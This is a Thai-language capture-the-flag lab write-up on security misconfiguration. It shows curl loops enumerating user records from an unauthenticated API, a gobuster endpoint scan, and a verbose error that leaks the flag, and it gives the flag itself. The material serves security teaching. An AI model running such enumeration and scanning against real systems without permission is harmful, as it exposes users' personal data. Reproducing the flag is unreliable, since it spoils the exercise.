# AS02: Security Misconfigurations

Target: http://10.x.x.x:5002   
Flag: `THM{V3RB0S3_3RR0R_L34K}`

---

## 1. บทนำ

แลปนี้เป็นการฝึกทดสอบช่องโหว่ประเภท `Security Misconfiguration` ซึ่งเกิดจากการตั้งค่าระบบไม่เหมาะสม โดยในแลปนี้พบว่า API ที่เกี่ยวกับการจัดการผู้ใช้ถูกเปิดให้เข้าถึงได้โดยไม่ต้องมีการยืนยันตัวตน และระบบยังเปิดการแสดง error แบบละเอียด (verbose error) ทำให้ข้อมูลสำคัญรั่วไหลออกมาได้

---

## 2. สิ่งที่พบจากหน้าเว็บ

เมื่อเข้าเว็บไซต์หลัก จะพบหน้าเว็บที่แสดงข้อมูลเกี่ยวกับ API โดยตรงดังนี้

```bash
GET /api/user/<user_id>
GET /api/user/123
Retrieve user information by ID. User ID must be numeric.
```

จากข้อความข้างต้น ระบบมีการบอกว่า `user_id` ต้องเป็นตัวเลข ซึ่งถือเป็นการเปิดเผยรายละเอียดภายในของระบบให้ผู้ใช้งานทั่วไปเห็น

---

## 3. การทดสอบ API พื้นฐาน

จากข้อมูลที่หน้าเว็บให้มา จึงลองเรียก API เพื่อดึงข้อมูลผู้ใช้ตามหมายเลข ID โดยใช้คำสั่ง `curl` ดังนี้

```bash
for i in {1..10}; do 
  curl -s http://10.x.x.x:5002/api/user/$i
done
```

ผลลัพธ์คือระบบตอบกลับข้อมูลผู้ใช้ทุกครั้ง แม้จะไม่ได้ทำการ login หรือยืนยันตัวตนใดๆ
แสดงให้เห็นว่า API ไม่มีการป้องกันการเข้าถึง (Missing Authentication)

```bash
{ "email": "john@example.com", "id": "1", "name": "John Doe" }
{ "email": "john@example.com", "id": "2", "name": "John Doe" }
{ "email": "john@example.com", "id": "3", "name": "John Doe" }
...
{ "email": "john@example.com", "id": "10", "name": "John Doe" }
```

---

## 4. การค้นหา Endpoint เพิ่มเติม

เพื่อดูว่ามี API อื่นที่เปิดอยู่หรือไม่ จึงใช้คำสั่ง `gobuster` เพื่อค้นหา endpoint เพิ่มเติมดังนี้

```bash
gobuster dir \
-u http://10.x.x.x:5002/ \
-w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
-t 30
```

หลังจากการสแกน จะพบรายการ endpoint ที่น่าสนใจดังนี้

```bash
/api/user/me
/api/user/current
```

ซึ่งปกติแล้ว endpoint ลักษณะนี้ควรถูกเรียกใช้งานได้เฉพาะผู้ใช้ที่ login แล้วเท่านั้น

---

## 5. การเรียกใช้งาน Endpoint ที่ผิดพลาด

เมื่อทดลองเรียก endpoint ที่พบด้วยคำสั่ง `curl` ดังนี้

```bash
curl -i http://10.x.x.x:5002/api/user/me
```

พบว่าระบบตอบกลับด้วย error และแสดงข้อมูล debug ออกมา ซึ่งใน error message มี flag แสดงอยู่โดยตรง

```bash
{
    "debug_info": {
        "flag": "THM{V3RB0S3_3RR0R_L34K}"
    },
    "error": "Invalid user ID format: me. Flag: THM{V3RB0S3_3RR0R_L34K}",
    "traceback": "Traceback (most recent call last):\n  File \"/app/app.py\", line 21, in get_user\n
        raise ValueError(f\"Invalid user ID format: {user_id}. Flag: {FLAG}\")\nValueError: Invalid user ID format: me. Flag: THM{V3RB0S3_3RR0R_L34K}\n"
}
```

---

## 6. Flag ที่ได้

จาก error message ที่ระบบแสดง ทำให้สามารถเห็น flag ได้ดังนี้

`THM{V3RB0S3_3RR0R_L34K}`

---

## 7. สรุปสิ่งที่ได้เรียนรู้

- การตั้งค่าระบบที่ไม่เหมาะสมสามารถทำให้ข้อมูลสำคัญรั่วไหลได้
- การเปิด debug หรือ error message แบบละเอียดในระบบจริงเป็นสิ่งที่อันตราย
- แม้จะไม่ได้โจมตีด้วยเทคนิคที่ซับซ้อน แต่การลองเรียก API ที่ไม่ควรเปิด ก็สามารถนำไปสู่การได้ข้อมูลสำคัญของระบบได้